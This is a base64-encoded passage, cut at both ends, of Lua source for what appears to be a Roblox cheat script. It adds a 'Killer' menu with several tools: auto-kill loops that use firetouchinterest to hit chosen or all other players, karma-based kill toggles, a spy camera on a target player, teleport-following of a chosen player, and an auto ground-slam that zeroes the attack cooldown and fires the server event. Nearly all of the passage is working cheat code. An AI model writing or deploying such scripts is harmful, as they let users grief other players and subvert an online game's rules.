lcjpGaW5kRmlyc3RDaGlsZCgiTGVmdEhhbmQiKQoKICAgICAgICAgICAgbG9jYWwgcHVuY2ggPSBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKQogICAgICAgICAgICBpZiBwdW5jaCBhbmQgbm90IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKSB0aGVuCiAgICAgICAgICAgICAgICBwdW5jaC5QYXJlbnQgPSBjaGFyYWN0ZXIKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBpZiByaWdodEhhbmQgYW5kIGxlZnRIYW5kIHRoZW4KICAgICAgICAgICAgICAgIGZvciBfLCB0YXJnZXQgaW4gaXBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIHRhcmdldCB+PSBMb2NhbFBsYXllciBhbmQgbm90IHBsYXllcldoaXRlbGlzdFt0YXJnZXQuTmFtZV0gdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXRDaGFyID0gdGFyZ2V0LkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCByb290UGFydCA9IHRhcmdldENoYXIgYW5kIHRhcmdldENoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgICAgICAgICAgICAgICAgICBpZiByb290UGFydCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3QocmlnaHRIYW5kLCByb290UGFydCwgMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdChsZWZ0SGFuZCwgcm9vdFBhcnQsIDEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3QocmlnaHRIYW5kLCByb290UGFydCwgMCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdChsZWZ0SGFuZCwgcm9vdFBhcnQsIDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgdGFzay53YWl0KDAuMDUpCiAgICAgICAgZW5kCiAgICBlbmQpCmVuZCkKCmxvY2FsIHRhcmdldERyb3Bkb3duID0gS2lsbGVyOkFkZERyb3Bkb3duKCJTZWxlY3QgVGFyZ2V0IiwgZnVuY3Rpb24obmFtZSkKICAgIGlmIG5hbWUgYW5kIG5vdCB0YWJsZS5maW5kKHRhcmdldFBsYXllck5hbWVzLCBuYW1lKSB0aGVuCiAgICAgICAgdGFibGUuaW5zZXJ0KHRhcmdldFBsYXllck5hbWVzLCBuYW1lKQogICAgZW5kCmVuZCkKCktpbGxlcjpBZGRUZXh0Qm94KCJSZW1vdmUgVGFyZ2V0IiwgZnVuY3Rpb24obmFtZSkKICAgIGZvciBpLCB2IGluIGlwYWlycyh0YXJnZXRQbGF5ZXJOYW1lcykgZG8KICAgICAgICBpZiB2ID09IG5hbWUgdGhlbgogICAgICAgICAgICB0YWJsZS5yZW1vdmUodGFyZ2V0UGxheWVyTmFtZXMsIGkpCiAgICAgICAgICAgIGJyZWFrCiAgICAgICAgZW5kCiAgICBlbmQKZW5kKQoKZm9yIF8sIHBsYXllciBpbiBpcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICBpZiBwbGF5ZXIgfj0gTG9jYWxQbGF5ZXIgdGhlbgogICAgICAgIHRhcmdldERyb3Bkb3duOkFkZChwbGF5ZXIuTmFtZSkKICAgICAgICB0YXJnZXREcm9wZG93bkl0ZW1zW3BsYXllci5OYW1lXSA9IHRydWUKICAgIGVuZAplbmQKClBsYXllcnMuUGxheWVyQWRkZWQ6Q29ubmVjdChmdW5jdGlvbihwbGF5ZXIpCiAgICBpZiBwbGF5ZXIgfj0gTG9jYWxQbGF5ZXIgdGhlbgogICAgICAgIHRhcmdldERyb3Bkb3duOkFkZChwbGF5ZXIuTmFtZSkKICAgICAgICB0YXJnZXREcm9wZG93bkl0ZW1zW3BsYXllci5OYW1lXSA9IHRydWUKICAgIGVuZAplbmQpCgpQbGF5ZXJzLlBsYXllclJlbW92aW5nOkNvbm5lY3QoZnVuY3Rpb24ocGxheWVyKQogICAgaWYgdGFyZ2V0RHJvcGRvd25JdGVtc1twbGF5ZXIuTmFtZV0gdGhlbgogICAgICAgIHRhcmdldERyb3Bkb3duSXRlbXNbcGxheWVyLk5hbWVdID0gbmlsCiAgICAgICAgdGFyZ2V0RHJvcGRvd246Q2xlYXIoKQogICAgICAgIGZvciBuYW1lIGluIHBhaXJzKHRhcmdldERyb3Bkb3duSXRlbXMpIGRvCiAgICAgICAgICAgIHRhcmdldERyb3Bkb3duOkFkZChuYW1lKQogICAgICAgIGVuZAogICAgZW5kCgogICAgZm9yIGkgPSAjdGFyZ2V0UGxheWVyTmFtZXMsIDEsIC0xIGRvCiAgICAgICAgaWYgdGFyZ2V0UGxheWVyTmFtZXNbaV0gPT0gcGxheWVyLk5hbWUgdGhlbgogICAgICAgICAgICB0YWJsZS5yZW1vdmUodGFyZ2V0UGxheWVyTmFtZXMsIGkpCiAgICAgICAgZW5kCiAgICBlbmQKZW5kKQoKS2lsbGVyOkFkZFN3aXRjaCgiU3RhcnQgS2lsbCBUYXJnZXQiLCBmdW5jdGlvbihzdGF0ZSkKICAgIGtpbGxUYXJnZXQgPSBzdGF0ZQoKICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIHdoaWxlIGtpbGxUYXJnZXQgZG8KICAgICAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIG9yIExvY2FsUGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQoKICAgICAgICAgICAgbG9jYWwgcHVuY2ggPSBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKQogICAgICAgICAgICBpZiBwdW5jaCBhbmQgbm90IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKSB0aGVuCiAgICAgICAgICAgICAgICBwdW5jaC5QYXJlbnQgPSBjaGFyYWN0ZXIKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBsb2NhbCByaWdodEhhbmQgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJSaWdodEhhbmQiLCA1KQogICAgICAgICAgICBsb2NhbCBsZWZ0SGFuZCA9IGNoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkxlZnRIYW5kIiwgNSkKCiAgICAgICAgICAgIGlmIHJpZ2h0SGFuZCBhbmQgbGVmdEhhbmQgdGhlbgogICAgICAgICAgICAgICAgZm9yIF8sIG5hbWUgaW4gaXBhaXJzKHRhcmdldFBsYXllck5hbWVzKSBkbwogICAgICAgICAgICAgICAgICAgIGxvY2FsIHRhcmdldCA9IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQobmFtZSkKICAgICAgICAgICAgICAgICAgICBpZiB0YXJnZXQgYW5kIHRhcmdldCB+PSBMb2NhbFBsYXllciB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHJvb3RQYXJ0ID0gdGFyZ2V0LkNoYXJhY3RlciBhbmQgdGFyZ2V0LkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHJvb3RQYXJ0IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdChyaWdodEhhbmQsIHJvb3RQYXJ0LCAxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KGxlZnRIYW5kLCByb290UGFydCwgMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdChyaWdodEhhbmQsIHJvb3RQYXJ0LCAwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KGxlZnRIYW5kLCByb290UGFydCwgMCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICB0YXNrLndhaXQoMC4wNSkKICAgICAgICBlbmQKICAgIGVuZCkKZW5kKQoKbG9jYWwgc3B5VGFyZ2V0RHJvcGRvd24gPSBLaWxsZXI6QWRkRHJvcGRvd24oIlNlbGVjdCBWaWV3IFRhcmdldCIsIGZ1bmN0aW9uKG5hbWUpCiAgICB0YXJnZXRQbGF5ZXJOYW1lID0gbmFtZQplbmQpCgpmb3IgXywgcGxheWVyIGluIGlwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgIGlmIHBsYXllciB+PSBMb2NhbFBsYXllciB0aGVuCiAgICAgICAgc3B5VGFyZ2V0RHJvcGRvd246QWRkKHBsYXllci5OYW1lKQogICAgZW5kCmVuZAoKUGxheWVycy5QbGF5ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKHBsYXllcikKICAgIGlmIHBsYXllciB+PSBMb2NhbFBsYXllciB0aGVuCiAgICAgICAgc3B5VGFyZ2V0RHJvcGRvd246QWRkKHBsYXllci5OYW1lKQogICAgZW5kCmVuZCkKClBsYXllcnMuUGxheWVyUmVtb3Zpbmc6Q29ubmVjdChmdW5jdGlvbihwbGF5ZXIpCiAgICBpZiBwbGF5ZXIgfj0gTG9jYWxQbGF5ZXIgdGhlbgogICAgICAgIHNweVRhcmdldERyb3Bkb3duOkNsZWFyKCkKICAgICAgICBmb3IgXywgcGxyIGluIGlwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgICAgICAgICAgaWYgcGxyIH49IExvY2FsUGxheWVyIHRoZW4KICAgICAgICAgICAgICAgIHNweVRhcmdldERyb3Bkb3duOkFkZChwbHIuTmFtZSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKZW5kKQoKS2lsbGVyOkFkZFN3aXRjaCgiVmlldyBQbGF5ZXIiLCBmdW5jdGlvbihib29sKQogICAgc3B5aW5nID0gYm9vbAogICAgaWYgbm90IHNweWluZyB0aGVuCiAgICAgICAgbG9jYWwgY2FtID0gd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEKICAgICAgICBjYW0uQ2FtZXJhU3ViamVjdCA9IExvY2FsUGxheWVyLkNoYXJhY3RlciBhbmQgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpIG9yIExvY2FsUGxheWVyCiAgICAgICAgcmV0dXJuCiAgICBlbmQKICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIHdoaWxlIHNweWluZyBkbwogICAgICAgICAgICBsb2NhbCB0YXJnZXQgPSBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKHRhcmdldFBsYXllck5hbWUpCiAgICAgICAgICAgIGlmIHRhcmdldCBhbmQgdGFyZ2V0IH49IExvY2FsUGxheWVyIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIGh1bWFub2lkID0gdGFyZ2V0LkNoYXJhY3RlciBhbmQgdGFyZ2V0LkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKQogICAgICAgICAgICAgICAgaWYgaHVtYW5vaWQgdGhlbgogICAgICAgICAgICAgICAgICAgIHdvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNhbWVyYVN1YmplY3QgPSBodW1hbm9pZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgIGVuZAogICAgZW5kKQplbmQpCgpLaWxsZXI6QWRkU3dpdGNoKCJBdXRvIEdvb2QgS2FybWEiLCBmdW5jdGlvbihib29sKQogICAgYXV0b0dvb2RLYXJtYSA9IGJvb2wKICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIHdoaWxlIGF1dG9Hb29kS2FybWEgZG8KICAgICAgICAgICAgbG9jYWwgcGxheWVyQ2hhciA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICBsb2NhbCByaWdodEhhbmQgPSBwbGF5ZXJDaGFyIGFuZCBwbGF5ZXJDaGFyOkZpbmRGaXJzdENoaWxkKCJSaWdodEhhbmQiKQogICAgICAgICAgICBsb2NhbCBsZWZ0SGFuZCA9IHBsYXllckNoYXIgYW5kIHBsYXllckNoYXI6RmluZEZpcnN0Q2hpbGQoIkxlZnRIYW5kIikKICAgICAgICAgICAgaWYgcGxheWVyQ2hhciBhbmQgcmlnaHRIYW5kIGFuZCBsZWZ0SGFuZCB0aGVuCiAgICAgICAgICAgICAgICBmb3IgXywgdGFyZ2V0IGluIGlwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgICAgICAgICAgICAgICAgICBpZiB0YXJnZXQgfj0gTG9jYWxQbGF5ZXIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBldmlsS2FybWEgPSB0YXJnZXQ6RmluZEZpcnN0Q2hpbGQoImV2aWxLYXJtYSIpCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGdvb2RLYXJtYSA9IHRhcmdldDpGaW5kRmlyc3RDaGlsZCgiZ29vZEthcm1hIikKICAgICAgICAgICAgICAgICAgICAgICAgaWYgZXZpbEthcm1hIGFuZCBnb29kS2FybWEgYW5kIGV2aWxLYXJtYTpJc0EoIkludFZhbHVlIikgYW5kIGdvb2RLYXJtYTpJc0EoIkludFZhbHVlIikgYW5kIGV2aWxLYXJtYS5WYWx1ZSA+IGdvb2RLYXJtYS5WYWx1ZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCByb290UGFydCA9IHRhcmdldC5DaGFyYWN0ZXIgYW5kIHRhcmdldC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgcm9vdFBhcnQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHJpZ2h0SGFuZCwgcm9vdFBhcnQsIDEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3QobGVmdEhhbmQsIHJvb3RQYXJ0LCAxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHJpZ2h0SGFuZCwgcm9vdFBhcnQsIDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3QobGVmdEhhbmQsIHJvb3RQYXJ0LCAwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICB0YXNrLndhaXQoMC4wMSkKICAgICAgICBlbmQKICAgIGVuZCkKZW5kKQoKS2lsbGVyOkFkZFN3aXRjaCgiQXV0byBCYWQgS2FybWEgKEZhc3QgQXV0byBLaWxsKSAiLCBmdW5jdGlvbihib29sKQogICAgYXV0b0JhZEthcm1hID0gYm9vbAogICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgd2hpbGUgYXV0b0JhZEthcm1hIGRvCiAgICAgICAgICAgIGxvY2FsIHBsYXllckNoYXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgbG9jYWwgcmlnaHRIYW5kID0gcGxheWVyQ2hhciBhbmQgcGxheWVyQ2hhcjpGaW5kRmlyc3RDaGlsZCgiUmlnaHRIYW5kIikKICAgICAgICAgICAgbG9jYWwgbGVmdEhhbmQgPSBwbGF5ZXJDaGFyIGFuZCBwbGF5ZXJDaGFyOkZpbmRGaXJzdENoaWxkKCJMZWZ0SGFuZCIpCiAgICAgICAgICAgIGlmIHBsYXllckNoYXIgYW5kIHJpZ2h0SGFuZCBhbmQgbGVmdEhhbmQgdGhlbgogICAgICAgICAgICAgICAgZm9yIF8sIHRhcmdldCBpbiBpcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgdGFyZ2V0IH49IExvY2FsUGxheWVyIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgZXZpbEthcm1hID0gdGFyZ2V0OkZpbmRGaXJzdENoaWxkKCJldmlsS2FybWEiKQogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBnb29kS2FybWEgPSB0YXJnZXQ6RmluZEZpcnN0Q2hpbGQoImdvb2RLYXJtYSIpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGV2aWxLYXJtYSBhbmQgZ29vZEthcm1hIGFuZCBldmlsS2FybWE6SXNBKCJJbnRWYWx1ZSIpIGFuZCBnb29kS2FybWE6SXNBKCJJbnRWYWx1ZSIpIGFuZCBnb29kS2FybWEuVmFsdWUgPiBldmlsS2FybWEuVmFsdWUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgcm9vdFBhcnQgPSB0YXJnZXQuQ2hhcmFjdGVyIGFuZCB0YXJnZXQuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHJvb3RQYXJ0IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdChyaWdodEhhbmQsIHJvb3RQYXJ0LCAxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KGxlZnRIYW5kLCByb290UGFydCwgMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdChyaWdodEhhbmQsIHJvb3RQYXJ0LCAwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KGxlZnRIYW5kLCByb290UGFydCwgMCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgdGFzay53YWl0KDAuMDEpCiAgICAgICAgZW5kCiAgICBlbmQpCmVuZCkKCmxvY2FsIFBsYXllcnMgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQpsb2NhbCBMb2NhbFBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKCmxvY2FsIGZvbGxvd2luZyA9IGZhbHNlCmxvY2FsIGZvbGxvd1RhcmdldCA9IG5pbAoKLS0g8J+TjCBGdW5jacOzbjogVFAgZGV0csOhcyBkZWwganVnYWRvcgpsb2NhbCBmdW5jdGlvbiBmb2xsb3dQbGF5ZXIodGFyZ2V0UGxheWVyKQogICAgbG9jYWwgbXlDaGFyID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICBsb2NhbCB0YXJnZXRDaGFyID0gdGFyZ2V0UGxheWVyLkNoYXJhY3RlcgoKICAgIGlmIG5vdCAobXlDaGFyIGFuZCB0YXJnZXRDaGFyKSB0aGVuIHJldHVybiBlbmQKICAgIGxvY2FsIG15SFJQID0gbXlDaGFyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgIGxvY2FsIHRhcmdldEhSUCA9IHRhcmdldENoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQoKICAgIGlmIG15SFJQIGFuZCB0YXJnZXRIUlAgdGhlbgogICAgICAgIGxvY2FsIGZvbGxvd1BvcyA9IHRhcmdldEhSUC5Qb3NpdGlvbiAtICh0YXJnZXRIUlAuQ0ZyYW1lLkxvb2tWZWN0b3IgKiAzKQogICAgICAgIG15SFJQLkNGcmFtZSA9IENGcmFtZS5uZXcoZm9sbG93UG9zLCB0YXJnZXRIUlAuUG9zaXRpb24pCiAgICBlbmQKZW5kCgotLSDwn5OMIERyb3Bkb3duIGRpbsOhbWljbyBkZSBqdWdhZG9yZXMKbG9jYWwgZm9sbG93RHJvcGRvd24gPSBLaWxsZXI6QWRkRHJvcGRvd24oIlRlbGVwb3J0IHBsYXllciIsIGZ1bmN0aW9uKHNlbGVjdGVkRGlzcGxheU5hbWUpCiAgICBpZiBzZWxlY3RlZERpc3BsYXlOYW1lIGFuZCBzZWxlY3RlZERpc3BsYXlOYW1lIH49ICIiIHRoZW4KICAgICAgICAtLSBCdXNjYXIganVnYWRvciBwb3IgRGlzcGxheU5hbWUKICAgICAgICBsb2NhbCB0YXJnZXQgPSBuaWwKICAgICAgICBmb3IgXywgcGxyIGluIGlwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgICAgICAgICAgaWYgcGxyLkRpc3BsYXlOYW1lID09IHNlbGVjdGVkRGlzcGxheU5hbWUgdGhlbgogICAgICAgICAgICAgICAgdGFyZ2V0ID0gcGxyCiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKCiAgICAgICAgaWYgdGFyZ2V0IHRoZW4KICAgICAgICAgICAgZm9sbG93VGFyZ2V0ID0gdGFyZ2V0Lk5hbWUgLS0gR3VhcmRhbW9zIE5hbWUgcmVhbCBwYXJhIHNlZ3VpcgogICAgICAgICAgICBmb2xsb3dpbmcgPSB0cnVlCiAgICAgICAgICAgIHByaW50KCLinIUgU3RhcnRlZCBmb2xsb3dpbmc6IiwgdGFyZ2V0Lk5hbWUpCgogICAgICAgICAgICAtLSBUUCBpbm1lZGlhdG8KICAgICAgICAgICAgZm9sbG93UGxheWVyKHRhcmdldCkKICAgICAgICBlbmQKICAgIGVuZAplbmQpCgotLSDwn5OMIEluaWNpYWxpemFyIGxpc3RhIGNvbiBEaXNwbGF5TmFtZXMKZm9yIF8sIHBsYXllciBpbiBpcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICBpZiBwbGF5ZXIgfj0gTG9jYWxQbGF5ZXIgdGhlbgogICAgICAgIGZvbGxvd0Ryb3Bkb3duOkFkZChwbGF5ZXIuRGlzcGxheU5hbWUpCiAgICBlbmQKZW5kCgotLSDwn5OMIEFjdHVhbGl6YXIgbGlzdGEgY3VhbmRvIGVudHJlbiBqdWdhZG9yZXMKUGxheWVycy5QbGF5ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKHBsYXllcikKICAgIGlmIHBsYXllciB+PSBMb2NhbFBsYXllciB0aGVuCiAgICAgICAgZm9sbG93RHJvcGRvd246QWRkKHBsYXllci5EaXNwbGF5TmFtZSkKICAgIGVuZAplbmQpCgotLSDwn5OMIEFjdHVhbGl6YXIgbGlzdGEgY3VhbmRvIHNlIHZheWFuIGp1Z2Fkb3JlcwpQbGF5ZXJzLlBsYXllclJlbW92aW5nOkNvbm5lY3QoZnVuY3Rpb24ocGxheWVyKQogICAgLS0gTGltcGlhbW9zIHkgYWdyZWdhbW9zIGRlIG51ZXZvCiAgICBmb2xsb3dEcm9wZG93bjpDbGVhcigpCiAgICBmb3IgXywgcGxyIGluIGlwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgICAgICBpZiBwbHIgfj0gTG9jYWxQbGF5ZXIgdGhlbgogICAgICAgICAgICBmb2xsb3dEcm9wZG93bjpBZGQocGxyLkRpc3BsYXlOYW1lKQogICAgICAgIGVuZAogICAgZW5kCgogICAgLS0gRGVqYXIgZGUgc2VndWlyIHNpIHNlIGZ1ZQogICAgaWYgZm9sbG93VGFyZ2V0ID09IHBsYXllci5OYW1lIHRoZW4KICAgICAgICBmb2xsb3dUYXJnZXQgPSBuaWwKICAgICAgICBmb2xsb3dpbmcgPSBmYWxzZQogICAgZW5kCmVuZCkKCi0tIPCfk4wgQm90w7NuIHBhcmEgZGVqYXIgZGUgc2VndWlyCktpbGxlcjpBZGRCdXR0b24oIlN0b3AgRm9sbG93IiwgZnVuY3Rpb24oKQogICAgZm9sbG93aW5nID0gZmFsc2UKICAgIGZvbGxvd1RhcmdldCA9IG5pbAogICAgcHJpbnQoIuKblCBTdG9wcGVkIGZvbGxvd2luZyIpCmVuZCkKCi0tIPCfk4wgTG9vcCBkZSBzZWd1aW1pZW50byBhdXRvbcOhdGljbwp0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgIHdoaWxlIHRhc2sud2FpdCgwLjAxKSBkbwogICAgICAgIGlmIGZvbGxvd2luZyBhbmQgZm9sbG93VGFyZ2V0IHRoZW4KICAgICAgICAgICAgbG9jYWwgdGFyZ2V0ID0gUGxheWVyczpGaW5kRmlyc3RDaGlsZChmb2xsb3dUYXJnZXQpCiAgICAgICAgICAgIGlmIHRhcmdldCB0aGVuCiAgICAgICAgICAgICAgICBmb2xsb3dQbGF5ZXIodGFyZ2V0KQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBmb2xsb3dpbmcgPSBmYWxzZQogICAgICAgICAgICAgICAgZm9sbG93VGFyZ2V0ID0gbmlsCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCmVuZCkKCi0tIPCfk4wgUmVpbnRlbnRhciBjdWFuZG8gcmVzcGF3bmVlcwpMb2NhbFBsYXllci5DaGFyYWN0ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgIHRhc2sud2FpdCgxKQogICAgaWYgZm9sbG93aW5nIGFuZCBmb2xsb3dUYXJnZXQgdGhlbgogICAgICAgIGxvY2FsIHRhcmdldCA9IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQoZm9sbG93VGFyZ2V0KQogICAgICAgIGlmIHRhcmdldCB0aGVuCiAgICAgICAgICAgIGZvbGxvd1BsYXllcih0YXJnZXQpCiAgICAgICAgZW5kCiAgICBlbmQKZW5kKQoKbG9jYWwgZ29kRGFtYWdlQWN0aXZlID0gZmFsc2UKCktpbGxlcjpBZGRTd2l0Y2goImF1dG8gc2xhbXMiLCBmdW5jdGlvbihzdGF0ZSkKICAgIGdvZERhbWFnZUFjdGl2ZSA9IHN0YXRlCiAgICBpZiBzdGF0ZSB0aGVuCiAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgIHdoaWxlIGdvZERhbWFnZUFjdGl2ZSBkbwogICAgICAgICAgICAgICAgbG9jYWwgcGxheWVyID0gTG9jYWxQbGF5ZXIKICAgICAgICAgICAgICAgIGxvY2FsIGdyb3VuZFNsYW0gPSBwbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIkdyb3VuZCBTbGFtIikgb3IgKHBsYXllci5DaGFyYWN0ZXIgYW5kIHBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkdyb3VuZCBTbGFtIikpCgogICAgICAgICAgICAgICAgaWYgZ3JvdW5kU2xhbSB0aGVuCiAgICAgICAgICAgICAgICAgICAgaWYgZ3JvdW5kU2xhbS5QYXJlbnQgPT0gcGxheWVyLkJhY2twYWNrIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgZ3JvdW5kU2xhbS5QYXJlbnQgPSBwbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgaWYgZ3JvdW5kU2xhbTpGaW5kRmlyc3RDaGlsZCgiYXR0YWNrVGltZSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgZ3JvdW5kU2xhbS5hdHRhY2tUaW1lLlZhbHVlID0gMAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIHBsYXllci5tdXNjbGVFdmVudDpGaXJlU2VydmVyKCJzbGFtIikKICAgICAgICAgICAgICAgICAgICBncm91bmRTbGFtOkFjdGl2YXRlKCkKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgIGVuZAplbmQpCgpsb2NhbCBzZXJ2ZXJUYWIgPSB3aW5kb3c6QWRkVGFiKCJTZXJ2ZXIiKQoKc2VydmVyVGFiOkFkZExhYmVsKCJTZXJ2ZXIgT3B0aW9ucyIpCgotLSBBZGQgYWQgcmVtb3ZhbCBidXR0b24gdG8gTWlzYyAxCnNlcnZlclRhYjpBZGRCdXR0b24oIlJlbW92ZSBQb3J0YWxzIiwgZnVuY3Rpb24oKQogICAgLS0gUmVtb3ZlIGV4aXN0aW5nIGFk